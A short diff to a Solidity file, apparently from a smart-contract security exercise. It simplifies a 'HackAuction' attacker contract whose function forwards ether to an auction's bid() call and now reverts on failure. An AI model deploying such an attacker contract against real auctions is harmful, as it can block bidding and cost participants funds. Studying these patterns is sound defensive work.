@@ -17,12 +17,8 @@ contract Auction {
 }
 
 contract HackAuction {
-    event Response(bool success, bytes data);
-
     function hackBid(address payable auctionContract) public payable {
-        (bool success, bytes memory data) = auctionContract.call{value: msg.value}(
-            abi.encodeWithSignature("bid()")
-        );
-        emit Response(success, data);
+        (bool success, ) = auctionContract.call{value: msg.value}(abi.encodeWithSignature("bid()"));
+        require(success, "Something went wrong");
     }
 }
